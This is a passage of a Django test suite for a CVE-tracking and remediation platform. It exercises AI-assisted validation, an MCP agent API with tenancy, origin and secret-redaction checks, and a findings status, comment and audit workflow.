					{'kind': 'http_head', 'result': 'observed', 'summary': 'HEAD answered 200, Server: nginx/1.18.0'}])
			else:
				Triage.objects.filter(pk__in=ids).update(validation_status='observed')
			return {'ran': 1, 'reused': 0, 'hits': 0}
		with mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.validation.resolve_template', return_value=('', 'no template covers this CVE')), \
				mock.patch('cveFeed.validation_plan.plan', side_effect=plans) as planner, \
				mock.patch('cveFeed.validation.run_validation', side_effect=run_check) as checks, \
				mock.patch('cveFeed.triage.run_triage', return_value={'not_triaged': 1}):
			validate_match_on_demand(job_id)
		self.assertEqual([call.kwargs['selected_kinds'] for call in checks.call_args_list], [{'http_head'}, {'nmap_sv'}])
		self.assertEqual(planner.call_count, 2)
		self.assertEqual(planner.call_args.kwargs['observations'][0]['kind'], 'http_head')
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.status, 'completed')
		self.assertEqual(job.result['checks']['ran'], 2)
		self.assertEqual(job.result['check_state'], 'observed')
		self.assertEqual(len(job.result['plans']), 2)

	def test_invalid_product_correlation_closes_without_scanning_or_another_ai_call(self):
		from cveFeed.models import OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		self.match.matched_product = 'AWS Service -'
		self.match.matched_version = ''
		self.match.save(update_fields=['matched_product', 'matched_version'])
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		with mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.validation.run_validation') as checks, \
				mock.patch('cveFeed.triage.run_triage') as ai:
			validate_match_on_demand(job_id)
		checks.assert_not_called()
		ai.assert_not_called()
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.result['assessment_status'], 'closed_not_applicable')
		self.assertEqual(job.result['ai_state'], 'not_needed')
		self.match.refresh_from_db()
		self.assertEqual(self.match.ai_verdict, 'not_affected')
		detail = call(self.t_alice, 'GET', f'/api/v1/projects/proj-a/findings/match/{self.match.id}')[1]
		self.assertEqual(detail['assessment_status'], 'closed_not_applicable')
		self.assertEqual(call(self.t_alice, 'POST', path)[0], 409)

	def test_legacy_invalid_matches_are_reconciled_in_bounded_durable_pages(self):
		from cveFeed.models import BackgroundCursor
		from cveFeed.tasks import reconcile_invalid_correlations
		self.match.matched_product = 'AWS Service -'
		self.match.matched_version = ''
		self.match.save(update_fields=['matched_product', 'matched_version'])
		CVEMatch.objects.filter(pk=self.match_b.pk).update(matched_version='1.19.0', version_in_range=True)  # a match the policy keeps
		with mock.patch('cveFeed.triage.run_triage') as ai, mock.patch('cveFeed.validation.run_validation') as checks:
			first = reconcile_invalid_correlations(limit=1)
			second = reconcile_invalid_correlations(limit=1)
			third = reconcile_invalid_correlations(limit=1)
		ai.assert_not_called()
		checks.assert_not_called()
		self.assertEqual((first['reviewed'], first['closed']), (1, 1))
		self.assertEqual((second['reviewed'], second['closed']), (1, 0))
		self.assertEqual((third['reviewed'], third['closed']), (1, 0))
		self.assertEqual(BackgroundCursor.objects.get(lane='invalid_correlation').last_pk, self.match.pk)
		self.match.refresh_from_db()
		self.assertEqual(self.match.ai_verdict, 'not_affected')

	def test_stale_match_keeps_history_and_reopens_on_material_inventory_change(self):
		from cveFeed.correlation import close_stale, save_matches
		match_id, sub_id = self.match.pk, self.match.subdomain_id
		close_stale({}, ({sub_id}, {self.cve.pk}))
		self.match.refresh_from_db()
		self.assertEqual(self.match.ai_verdict, 'not_affected')
		self.assertEqual(self.match.pk, match_id)
		self.assertTrue(self.match.ai_reason.startswith('Closed automatically:'))
		changed = {'cve_entry_id': self.cve.pk, 'subdomain_id': sub_id, 'source': self.match.source,
			'matched_product': self.match.matched_product, 'matched_version': '1.19.0', 'version_in_range': True,
			'confidence': 0.9, 'scan_history_id': None, 'distro_status': 'no_data',
			'distro_fixed_version': '', 'evidence': {'source': 'tech', 'raw_version': '1.19.0'}}
		save_matches([changed], covered=({sub_id}, {self.cve.pk}))
		self.match.refresh_from_db()
		self.assertEqual((self.match.pk, self.match.ai_verdict, self.match.matched_version), (match_id, '', '1.19.0'))

	def test_finding_detail_exposes_only_safe_copyable_ai_diagnostic(self):
		from cveFeed import triage
		row, _ = triage.track(triage.with_cves([self.match]))[0]
		row.status = 'error'
		row.reason = json.dumps({'id': 'a1b2c3', 'time': timezone.now().isoformat(), 'stage': 'ai_triage',
			'category': 'provider_auth', 'provider': 'anthropic', 'http_status': 401,
			'secret': 'sk-ant-SHOULD-NOT-LEAK'})
		row.save(update_fields=['status', 'reason'])
		detail = call(self.t_alice, 'GET', f'/api/v1/projects/proj-a/findings/match/{self.match.id}')[1]
		self.assertEqual(detail['ai']['diagnostic']['http_status'], 401)
		self.assertEqual(detail['ai']['diagnostic']['category'], 'provider_auth')
		self.assertNotIn('SHOULD-NOT-LEAK', json.dumps(detail))

	def test_legacy_banner_only_result_is_shown_as_observed_not_negative(self):
		from cveFeed import triage
		row, _ = triage.track(triage.with_cves([self.match]))[0]
		row.validation_status = 'clean'
		row.validation_steps = [{'kind': 'http_head', 'result': 'observed', 'summary': 'HEAD answered 200, Server: nginx/1.18.0'}]
		row.save(update_fields=['validation_status', 'validation_steps'])
		detail = call(self.t_alice, 'GET', f'/api/v1/projects/proj-a/findings/match/{self.match.id}')[1]
		self.assertEqual(detail['validation']['status'], 'observed')
		listed = call(self.t_alice, 'GET', '/api/v1/projects/proj-a/matches')[1]['results']
		self.assertEqual(listed[0]['triage']['validation_status'], 'observed')

	def test_unknown_route_method_and_openapi(self):
		self.assertEqual(call(self.t_alice, 'GET', '/api/v1/nope')[0], 404)
		self.assertEqual(call(self.t_alice, 'DELETE', '/api/v1/projects')[0], 405)
		status, spec = call(self.t_alice, 'GET', '/api/v1/openapi.json')
		self.assertIn('/api/v1/projects/{slug}/work', spec['paths'])

	# --- MCP --------------------------------------------------------------
	def test_mcp_handshake_and_tool_list(self):
		status, data = rpc(self.t_alice, 'initialize', {'protocolVersion': '2025-03-26'})
		self.assertEqual(data['result']['protocolVersion'], '2025-03-26')
		self.assertIn('tools', data['result']['capabilities'])
		self.assertEqual(call(self.t_alice, 'POST', '/mcp/', {'jsonrpc': '2.0', 'method': 'notifications/initialized'})[0], 202)
		status, data = rpc(self.t_alice, 'tools/list')
		names = {t['name'] for t in data['result']['tools']}
		self.assertTrue({'list_projects', 'add_target', 'get_remediation_work', 'update_remediation_status'} <= names)
		self.assertEqual(rpc(self.t_alice, 'nope')[1]['error']['code'], -32601)
		self.assertEqual(call(self.t_alice, 'GET', '/mcp/')[0], 405)

	def mcp_post(self, body, **headers):
		from django.test import Client
		response = Client().post('/mcp/', json.dumps(body), content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {self.t_alice}', **headers)
		return response.status_code, (response.json() if response.content else None)

	def test_mcp_follows_the_transport_rules_of_the_spec(self):
		message = {'jsonrpc': '2.0', 'id': 1, 'method': 'tools/list'}
		# a browser page of another site: refused. No Origin (every MCP client) and this site's own Origin: fine
		self.assertEqual(self.mcp_post(message, HTTP_ORIGIN='https://evil.example.test')[0], 403)
		self.assertEqual(self.mcp_post(message)[0], 200)
		self.assertEqual(self.mcp_post(message, HTTP_ORIGIN='http://testserver')[0], 200)
		# a protocol version the server does not speak: 400; a supported one or none: fine
		self.assertEqual(self.mcp_post(message, HTTP_MCP_PROTOCOL_VERSION='1999-01-01')[0], 400)
		self.assertEqual(self.mcp_post(message, HTTP_MCP_PROTOCOL_VERSION='2025-06-18')[0], 200)
		# a client's own response or error to something the server never asked: accepted with 202 and no body
		self.assertEqual(self.mcp_post({'jsonrpc': '2.0', 'id': 7, 'result': {}}), (202, None))
		self.assertEqual(self.mcp_post({'jsonrpc': '2.0', 'id': 7, 'error': {'code': -1, 'message': 'x'}}), (202, None))

	def test_an_unknown_tool_is_a_protocol_error_and_a_crash_is_a_json_rpc_error(self):
		status, data = rpc(self.t_alice, 'tools/call', {'name': 'no_such_tool', 'arguments': {}})
		self.assertEqual((status, data['error']['code']), (200, -32602))
		with mock.patch('agentapi.mcp.call_tool', side_effect=RuntimeError('database exploded with a secret path /var/x')):
			status, data = rpc(self.t_alice, 'tools/call', {'name': 'list_projects', 'arguments': {}}, rpc_id=9)
		self.assertEqual((status, data['id'], data['error']['code']), (200, 9, -32603))
		self.assertNotIn('secret path', json.dumps(data))

	def _tool(self, token, name, args=None):
		status, data = rpc(token, 'tools/call', {'name': name, 'arguments': args or {}})
		content = data['result']['content'][0]['text']
		return data['result']['isError'], (json.loads(content) if not data['result']['isError'] else content)

	def test_mcp_tells_the_agent_which_text_is_untrusted(self):
		from agentapi.mcp import UNTRUSTED_NOTICE
		status, data = rpc(self.t_alice, 'initialize', {})
		self.assertIn(UNTRUSTED_NOTICE, data['result']['instructions'])
		status, data = rpc(self.t_alice, 'tools/call', {'name': 'list_projects', 'arguments': {}})
		self.assertEqual(data['result']['_meta']['cvengine/untrusted_text'], UNTRUSTED_NOTICE)
		self.assertNotIn('_meta', rpc(self.t_alice, 'tools/call', {'name': 'list_hosts', 'arguments': {'project': 'proj-b'}})[1]['result'])

	def test_mcp_tools_are_tenancy_scoped(self):
		err, data = self._tool(self.t_alice, 'list_projects')
		self.assertEqual([p['slug'] for p in data['results']], ['proj-a'])
		err, msg = self._tool(self.t_alice, 'list_hosts', {'project': 'proj-b'})
		self.assertEqual((err, msg), (True, 'project not found'))
		err, msg = self._tool(self.t_carol, 'add_target', {'project': 'proj-a', 'value': 'x.example'})
		self.assertEqual((err, msg), (True, 'audit role is read only'))
		err, msg = self._tool(self.t_ro, 'add_target', {'project': 'proj-a', 'value': 'x.example'})
		self.assertEqual((err, msg), (True, 'this token is read only'))
		self.assertEqual(rpc(self.t_alice, 'tools/call', {'name': 'no_such_tool', 'arguments': {}})[1]['error']['code'], -32602)  # a protocol error, not a tool result

	def test_an_over_long_assets_argument_is_refused_not_ground_through(self):
		err, data = self._tool(self.t_alice, 'get_remediation_work',
							   {'project': 'proj-a', 'assets': ','.join(f'h{n}.example' for n in range(501))})
		self.assertTrue(err)

	def test_mcp_agent_remediation_loop(self):
		err, data = self._tool(self.t_alice, 'register_assets', {'assets': ['www.a.example']})
		self.assertFalse(err)
		err, data = self._tool(self.t_alice, 'get_remediation_work', {'project': 'proj-a'})
		self.assertEqual(data['count'], 1)
		mid = data['results'][0]['id']
		err, data = self._tool(self.t_alice, 'update_remediation_status', {'project': 'proj-a', 'match_id': mid, 'status': 'in_progress', 'note': 'PR open'})
		self.assertEqual(data['remediation_status'], 'in_progress')
		err, data = self._tool(self.t_alice, 'update_remediation_status', {'project': 'proj-a', 'match_id': mid})
		self.assertTrue(err)  # missing status is a clean tool error


class FindingStatusTests(TestCase):
	"""The unified remediation-status workflow (open/in_progress/fixed/accepted_risk) on scanner and hygiene findings,
	alongside the existing CVE-match one: PATCH findings/{kind}/{id}, the bulk POST findings/status, and how both feed
	back into the actionable Findings view and the note's PATCH semantics."""

	@classmethod
	def setUpTestData(cls):
		now = timezone.now()
		org = Org.objects.create(name='FS', slug='fs-org')
		other_org = Org.objects.create(name='FS2', slug='fs-org-2')
		cls.proj = Project.objects.create(name='FS Project', slug='fs-proj', insert_date=now, org=org)
		cls.other_proj = Project.objects.create(name='FS Other', slug='fs-other', insert_date=now, org=other_org)
		cls.domain = Domain.objects.create(name='fs.example', project=cls.proj, insert_date=now)
		other_domain = Domain.objects.create(name='fs-other.example', project=cls.other_proj, insert_date=now)
		mk = lambda n: User.objects.create_user(n, password='x')
		cls.alice, cls.carol = mk('fsalice'), mk('fscarol')
		ProjectMembership.objects.create(user=cls.alice, project=cls.proj, role='user')
		ProjectMembership.objects.create(user=cls.carol, project=cls.proj, role='audit')
		_, cls.t_alice = create_token(cls.alice, 'agent')
		_, cls.t_ro = create_token(cls.alice, 'readonly', read_only=True)
		_, cls.t_carol = create_token(cls.carol, 'auditor')
		sub = Subdomain.objects.create(name='www.fs.example', target_domain=cls.domain)
		cls.vuln = Vulnerability.objects.create(name='Reflected XSS', severity=3, subdomain=sub, target_domain=cls.domain,
		                                        open_status=True, http_url='https://www.fs.example/', source='nuclei')
		cls.hyg = HygieneFinding.objects.create(domain=cls.domain, host='www.fs.example', check_name='spf_missing',
		                                        severity=2, title='No SPF')
		cls.route = RouteAuth.objects.create(project=cls.proj, domain=cls.domain, host='www.fs.example',
		                                     url='https://www.fs.example/admin', path='/admin', auth_state='login')
		other_sub = Subdomain.objects.create(name='www.fs-other.example', target_domain=other_domain)
		cls.vuln_other = Vulnerability.objects.create(name='Other XSS', severity=3, subdomain=other_sub, target_domain=other_domain,
		                                              open_status=True, http_url='https://www.fs-other.example/')

	def _base(self):
		return '/api/v1/projects/fs-proj'

	def test_patch_sets_status_and_note_for_each_kind(self):
		base = self._base()
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'status': 'in_progress', 'note': 'ticket #9'})
		self.assertEqual((status, data['remediation_status'], data['remediation_note']), (200, 'in_progress', 'ticket #9'))
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/hygiene/{self.hyg.id}', {'status': 'accepted_risk', 'note': 'vendor says no'})
		self.assertEqual((status, data['remediation_status'], data['remediation_note']), (200, 'accepted_risk', 'vendor says no'))

	def test_assignee_can_be_set_alone_changed_and_cleared_with_null(self):
		base = self._base()
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'assignee': self.alice.id})
		self.assertEqual(status, 200)
		self.assertEqual(data['assignee'], {'id': self.alice.id, 'username': 'fsalice', 'name': 'fsalice'})
		self.assertEqual(data['remediation_status'], 'open')  # untouched: assignee was sent alone
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'assignee': None})
		self.assertEqual((status, data['assignee']), (200, None))
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/hygiene/{self.hyg.id}', {'status': 'in_progress', 'assignee': self.carol.id})
		self.assertEqual((status, data['remediation_status'], data['assignee']['username']), (200, 'in_progress', 'fscarol'))

	def test_a_patch_needs_status_or_assignee_and_the_assignee_must_be_a_member(self):
		base = self._base()
		self.assertEqual(call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'note': 'x'})[0], 400)
		outsider = User.objects.create_user('fsoutsider', password='x')
		for bad in (outsider.id, 'abc', 99999999):
			status, _ = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'assignee': bad})
			self.assertEqual(status, 400, bad)

	def test_comments_are_listed_oldest_first_counted_and_audited(self):
		base = f'{self._base()}/findings/vulnerability/{self.vuln.id}'
		status, c1 = call(self.t_alice, 'POST', f'{base}/comments', {'text': 'looking into it'})
		self.assertEqual((status, c1['text'], c1['author']['username']), (201, 'looking into it', 'fsalice'))
		call(self.t_alice, 'POST', f'{base}/comments', {'text': 'second'})
		status, listed = call(self.t_alice, 'GET', f'{base}/comments')
		self.assertEqual((status, [c['text'] for c in listed['results']]), (200, ['looking into it', 'second']))
		self.assertEqual(call(self.t_alice, 'GET', base)[1]['comment_count'], 2)
		rows = call(self.t_alice, 'GET', f'{self._base()}/vulnerabilities')[1]['results']
		self.assertEqual(next(r for r in rows if r['id'] == self.vuln.id)['comment_count'], 2)
		self.assertEqual(call(self.t_alice, 'POST', f'{base}/comments', {'text': '   '})[0], 400)
		self.assertEqual(call(self.t_alice, 'POST', f'{base}/comments', {})[0], 400)

	def test_comment_writes_are_gated_like_every_other_write(self):
		base = f'{self._base()}/findings/vulnerability/{self.vuln.id}/comments'
		self.assertEqual(call(self.t_ro, 'POST', base, {'text': 'x'})[0], 403)
		self.assertEqual(call(self.t_carol, 'POST', base, {'text': 'x'})[0], 403)
		self.assertEqual(call(self.t_alice, 'GET', base.replace('fs-proj', 'fs-other'))[0], 404)
		other = f'/api/v1/projects/fs-proj/findings/vulnerability/{self.vuln_other.id}/comments'
		self.assertEqual(call(self.t_alice, 'POST', other, {'text': 'x'})[0], 404)  # another project's finding

	def test_the_audit_trail_records_status_assignee_and_comment_with_before_and_after(self):
		base = f'{self._base()}/findings/vulnerability/{self.vuln.id}'
		call(self.t_alice, 'PATCH', base, {'status': 'in_progress'})
		call(self.t_alice, 'PATCH', base, {'assignee': self.alice.id})
		call(self.t_alice, 'POST', f'{base}/comments', {'text': 'on it'})
		status, trail = call(self.t_alice, 'GET', f'{base}/audit')
		self.assertEqual(status, 200)
		events = list(reversed(trail['results']))  # newest first on the wire
		self.assertEqual([e['event'] for e in events], ['status', 'assignee', 'comment'])
		self.assertEqual((events[0]['before'], events[0]['after']), ({'status': 'open'}, {'status': 'in_progress'}))
		self.assertEqual((events[1]['before'], events[1]['after']['assignee']['username']), ({'assignee': None}, 'fsalice'))
		self.assertEqual(events[2]['after']['text'], 'on it')
		self.assertTrue(all(e['actor']['username'] == 'fsalice' for e in events))

	def test_bulk_status_changes_are_audited_too(self):
		status, _ = call(self.t_alice, 'POST', f'{self._base()}/findings/status', {'items': [{'kind': 'hygiene', 'id': self.hyg.id}], 'status': 'fixed'})
		self.assertEqual(status, 200)
		trail = call(self.t_alice, 'GET', f'{self._base()}/findings/hygiene/{self.hyg.id}/audit')[1]['results']
		self.assertEqual([(e['event'], e['after']) for e in trail], [('status', {'status': 'fixed'})])

	def test_members_lists_direct_and_org_members_for_the_picker(self):
		from dashboard.models import OrgMembership
		orgish = User.objects.create_user('fsorg', password='x')
		OrgMembership.objects.create(user=orgish, org=self.proj.org, role='user')
		status, data = call(self.t_alice, 'GET', f'{self._base()}/members')
		self.assertEqual(status, 200)
		self.assertEqual([m['username'] for m in data['results']], ['fsalice', 'fscarol', 'fsorg'])
		self.assertEqual(call(self.t_alice, 'GET', '/api/v1/projects/fs-other/members')[0], 404)

	def test_members_comments_and_audit_trail_come_a_page_at_a_time(self):
		base = f'{self._base()}/findings/vulnerability/{self.vuln.id}'
		for n in range(3):
			call(self.t_alice, 'POST', f'{base}/comments', {'text': f'note {n}'})
		status, page = call(self.t_alice, 'GET', f'{base}/comments?page_size=2')
		self.assertEqual((status, page['count'], page['page_size'], [c['text'] for c in page['results']]), (200, 3, 2, ['note 0', 'note 1']))
		self.assertEqual([c['text'] for c in call(self.t_alice, 'GET', f'{base}/comments?page_size=2&page=2')[1]['results']], ['note 2'])
		audit = call(self.t_alice, 'GET', f'{base}/audit?page_size=1')[1]
		self.assertEqual((audit['count'], len(audit['results'])), (3, 1))
		self.assertEqual(call(self.t_alice, 'GET', f'{self._base()}/members?page_size=1')[1]['page_size'], 1)
		self.assertEqual(call(self.t_alice, 'GET', f'{base}/comments?page=x')[0], 400)

	def test_detail_carries_status_assignee_and_comment_count_for_every_kind(self):
		base = self._base()
		call(self.t_alice, 'PATCH', f'{base}/findings/hygiene/{self.hyg.id}', {'status': 'accepted_risk', 'note': 'ok', 'assignee': self.alice.id})
		status, data = call(self.t_alice, 'GET', f'{base}/findings/hygiene/{self.hyg.id}')
		self.assertEqual(status, 200)
		self.assertEqual((data['remediation']['status'], data['remediation']['note']), ('accepted_risk', 'ok'))
		self.assertEqual((data['assignee']['username'], data['status_changed_by']['username'], data['comment_count']), ('fsalice', 'fsalice', 0))
		self.assertIsNotNone(data['status_changed_at'])
		route = call(self.t_alice, 'GET', f'{base}/findings/route/{self.route.id}')[1]
		self.assertEqual((route['assignee'], route['comment_count'], route['status_changed_at']), (None, 0, None))

	def test_mcp_assign_comment_audit_and_members_tools(self):
		from tests.test_agentapi import tool_call
		args = {'project': 'fs-proj', 'kind': 'vulnerability', 'id': self.vuln.id}
		self.assertFalse(tool_call(self.t_alice, 'set_finding_assignee', {**args, 'assignee': self.alice.id})[0])
		self.assertFalse(tool_call(self.t_alice, 'add_finding_comment', {**args, 'text': 'via mcp'})[0])
		self.assertEqual([c['text'] for c in tool_call(self.t_alice, 'list_finding_comments', args)[1]['results']], ['via mcp'])
		self.assertEqual({e['event'] for e in tool_call(self.t_alice, 'finding_audit', args)[1]['results']}, {'assignee', 'comment'})
		self.assertIn('fsalice', [m['username'] for m in tool_call(self.t_alice, 'list_members', {'project': 'fs-proj'})[1]['results']])
		unassigned = tool_call(self.t_alice, 'set_finding_assignee', {**args, 'assignee': None})
		self.assertEqual((unassigned[0], unassigned[1]['assignee']), (False, None))

	def test_serializers_count_comments_for_a_row_the_queryset_did_not_annotate(self):
		from agentapi.services import _hygiene
		from cveFeed.models import FindingComment
		base = f'{self._base()}/findings/hygiene/{self.hyg.id}'
		call(self.t_alice, 'POST', f'{base}/comments', {'text': 'one'})
		call(self.t_alice, 'POST', f'{base}/comments', {'text': 'two'})
		plain = HygieneFinding.objects.select_related('domain').get(pk=self.hyg.id)  # no comment_count annotation
		self.assertFalse(hasattr(plain, 'comment_count'))
		self.assertEqual(_hygiene(plain)['comment_count'], 2)
		self.assertEqual(FindingComment.objects.filter(finding_kind='hygiene', finding_id=self.hyg.id).count(), 2)

	def test_status_changed_at_and_by_are_set_by_a_patch(self):
		base = self._base()
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'status': 'in_progress'})
		self.assertEqual(status, 200)
		self.assertIsNotNone(data['status_changed_at'])
		self.assertEqual(data['status_changed_at'], data['remediation_updated'])
		self.assertEqual(data['status_changed_by'], {'id': self.alice.id, 'username': 'fsalice', 'name': 'fsalice'})
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/hygiene/{self.hyg.id}', {'status': 'fixed'})
		self.assertEqual((status, data['status_changed_by']['username']), (200, 'fsalice'))

	def test_patch_match_kind_delegates_to_the_same_route_as_matches(self):
		cve = CVEEntry.objects.create(cve_id='CVE-2099-50', cvss=7.0, title='x', published_at=timezone.now())
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=Subdomain.objects.create(name='m.fs.example', target_domain=self.domain), confidence=0.5)
		status, data = call(self.t_alice, 'PATCH', f'{self._base()}/findings/match/{match.id}', {'status': 'fixed'})
		self.assertEqual((status, data['remediation_status']), (200, 'fixed'))
		match.refresh_from_db()
		self.assertEqual(match.remediation_status, 'fixed')

	def test_bad_status_is_rejected(self):
		status, data = call(self.t_alice, 'PATCH', f'{self._base()}/findings/vulnerability/{self.vuln.id}', {'status': 'bogus'})
		self.assertEqual(status, 400)

	def test_route_kind_has_no_remediation_workflow(self):
		status, data = call(self.t_alice, 'PATCH', f'{self._base()}/findings/route/{self.route.id}', {'status': 'fixed'})
		self.assertEqual(status, 400)

	def test_cross_project_id_is_404_not_another_projects_finding(self):
		status, data = call(self.t_alice, 'PATCH', f'{self._base()}/findings/vulnerability/{self.vuln_other.id}', {'status': 'fixed'})
		self.assertEqual(status, 404)

	def test_read_only_and_audit_role_cannot_write(self):
		self.assertEqual(call(self.t_ro, 'PATCH', f'{self._base()}/findings/vulnerability/{self.vuln.id}', {'status': 'fixed'})[0], 403)
		self.assertEqual(call(self.t_carol, 'PATCH', f'{self._base()}/findings/hygiene/{self.hyg.id}', {'status': 'fixed'})[0], 403)

	def test_omitting_note_preserves_it_but_an_explicit_empty_note_clears_it(self):
		base = self._base()
		call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'status': 'in_progress', 'note': 'keep me'})
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'status': 'fixed'})  # no 'note' key at all
		self.assertEqual((status, data['remediation_status'], data['remediation_note']), (200, 'fixed', 'keep me'))
		status, data = call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'status': 'open', 'note': ''})
		self.assertEqual((status, data['remediation_note']), (200, ''))

	def test_marking_fixed_or_accepted_risk_drops_out_of_actionable_findings(self):
		base = self._base()
		before = call(self.t_alice, 'GET', f'{base}/findings')[1]
		self.assertEqual((before['counts']['scanner'], before['counts']['hygiene']), (1, 1))
		call(self.t_alice, 'PATCH', f'{base}/findings/vulnerability/{self.vuln.id}', {'status': 'fixed'})
		call(self.t_alice, 'PATCH', f'{base}/findings/hygiene/{self.hyg.id}', {'status': 'accepted_risk'})
		after = call(self.t_alice, 'GET', f'{base}/findings')[1]
		self.assertEqual((after['counts']['scanner'], after['counts']['hygiene']), (0, 0))
		everything = call(self.t_alice, 'GET', f'{base}/findings?status=all')[1]
		self.assertEqual((everything['counts']['scanner'], everything['counts']['hygiene']), (1, 1))  # status=all still shows them

	def test_bulk_update_sets_many_and_reports_partial_failure(self):
		base = self._base()
		items = [{'kind': 'vulnerability', 'id': self.vuln.id}, {'kind': 'hygiene', 'id': self.hyg.id},
		         {'kind': 'vulnerability', 'id': 999999}, {'kind': 'route', 'id': self.route.id}]
		status, data = call(self.t_alice, 'POST', f'{base}/findings/status', {'items': items, 'status': 'accepted_risk', 'note': 'batch'})
		self.assertEqual((status, data['updated'], len(data['failed'])), (200, 2, 2))
		self.vuln.refresh_from_db()
		self.hyg.refresh_from_db()
		self.assertEqual((self.vuln.remediation_status, self.hyg.remediation_status), ('accepted_risk', 'accepted_risk'))

	def test_bulk_update_caps_at_200_items(self):
		items = [{'kind': 'vulnerability', 'id': self.vuln.id}] * 201
		status, data = call(self.t_alice, 'POST', f'{self._base()}/findings/status', {'items': items, 'status': 'fixed'})
		self.assertEqual(status, 400)

	def test_bulk_update_rejects_an_empty_or_malformed_items_list(self):
		self.assertEqual(call(self.t_alice, 'POST', f'{self._base()}/findings/status', {'items': [], 'status': 'fixed'})[0], 400)
		self.assertEqual(call(self.t_alice, 'POST', f'{self._base()}/findings/status', {'status': 'fixed'})[0], 400)

	def test_bulk_update_needs_write_access(self):
		items = [{'kind': 'vulnerability', 'id': self.vuln.id}]
		self.assertEqual(call(self.t_ro, 'POST', f'{self._base()}/findings/status', {'items': items, 'status': 'fixed'})[0], 403)
		self.assertEqual(call(self.t_carol, 'POST', f'{self._base()}/findings/status', {'items': items, 'status': 'fixed'})[0], 403)

	def test_mcp_update_finding_status_and_bulk(self):
		err, data = tool_call(self.t_alice, 'update_finding_status', {'project': 'fs-proj', 'kind': 'hygiene', 'id': self.hyg.id, 'status': 'in_progress'})
		self.assertFalse(err)
		self.assertEqual(data['remediation_status'], 'in_progress')
		items = [{'kind': 'vulnerability', 'id': self.vuln.id}, {'kind': 'hygiene', 'id': self.hyg.id}]
		err, data = tool_call(self.t_alice, 'bulk_update_finding_status', {'project': 'fs-proj', 'items': items, 'status': 'fixed'})
		self.assertFalse(err)
		self.assertEqual(data['updated'], 2)


class AgentsPageTests(TestCase):
	def test_page_renders_for_signed_in_users_only(self):
		user = User.objects.create_user('pageuser', password='x')
		OrgMembership.objects.create(user=user, org=Org.objects.create(name='P', slug='p'), role='user')  # no membership = no access
		self.assertEqual(Client().get('/cve/agents/').status_code, 302)
		r = client_for(user).get('/cve/agents/')
		self.assertEqual(r.status_code, 200)
		self.assertContains(r, 'Agent access')


class ModernUiTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		now = timezone.now()
		org = Org.objects.create(name='Org', slug='org')
		cls.pa = Project.objects.create(name='Alpha', slug='alpha', insert_date=now, org=org)
		cls.pb = Project.objects.create(name='Beta', slug='beta', insert_date=now, org=Org.objects.create(name='O2', slug='o2'))
		cls.user = User.objects.create_user('uiuser', password='pw-12345')
		ProjectMembership.objects.create(user=cls.user, project=cls.pa, role='user')

	def test_login_page_and_landing(self):
		r = Client().get('/login/')
		self.assertContains(r, 'Sign in')
		self.assertContains(r, 'cve.css')  # new design system, not the classic template
		r = Client().post('/login/', {'username': 'uiuser', 'password': 'pw-12345'})
		self.assertEqual((r.status_code, r['Location']), (302, '/cve/'))
		self.assertContains(Client().post('/login/', {'username': 'uiuser', 'password': 'bad'}), 'did not match')

	def test_section_pages_render_with_switcher_limited_to_own_projects(self):
		c = client_for(self.user)
		for section in ('targets', 'scans', 'hosts', 'vulns', 'matches'):
			r = c.get(f'/cve/alpha/{section}/')
			self.assertEqual(r.status_code, 200, section)
			self.assertContains(r, f'data-kind="{section}"')
		r = c.get('/cve/alpha/hosts/')
		self.assertContains(r, 'Alpha')
		self.assertNotContains(r, 'Beta')  # project switcher only lists permitted projects
		self.assertContains(c.get('/cve/beta/hosts/'), 'Page not found', status_code=404)  # not a member: themed page, no existence leak
		self.assertEqual(Client().get('/cve/alpha/hosts/').status_code, 302)

	def test_shell_has_mobile_and_desktop_nav_and_viewport(self):
		r = client_for(self.user).get('/cve/')
		self.assertContains(r, 'class="tabbar"')  # phones: bottom tab bar and the More sheet
		self.assertContains(r, 'class="rail"')  # desktop: sidebar
		self.assertContains(r, 'id="palette"')  # Ctrl/Cmd+K jump palette
		self.assertRegex(r.content.decode(), r'/staticfiles/cve/cve\.css\?v=[0-9a-f]{10}')  # content-versioned: a CDN cannot serve a stale one
		self.assertContains(r, 'type="importmap"')  # modules that import each other follow the versions too
		self.assertContains(r, 'width=device-width')
		self.assertContains(r, '/cve/alpha/targets/')


class HostHeatTests(TestCase):
	def test_worst_temperature_wins(self):
		from cveFeed.threat import host_heat
		self.assertEqual(host_heat('scanned', ['ice', 'fire', 'smoke'], []), 'fire')
		self.assertEqual(host_heat('scanned', ['ice'], [2]), 'smoke')  # a medium finding is hotter than an ice CVE
		self.assertEqual(host_heat('scanned', [], [3]), 'fire')  # high reads as fire
		self.assertEqual(host_heat('scanned', [], [0]), 'clean')  # info only
		self.assertEqual(host_heat('unscanned', [], []), 'unscanned')

	def test_hosts_api_and_graph_report_heat(self):
		from agentapi.services import Ctx, list_hosts
		from cveFeed.views import graph_payload
		now = timezone.now()
		org = Org.objects.create(name='H', slug='h')
		project = Project.objects.create(name='H', slug='heat-p', insert_date=now, org=org)
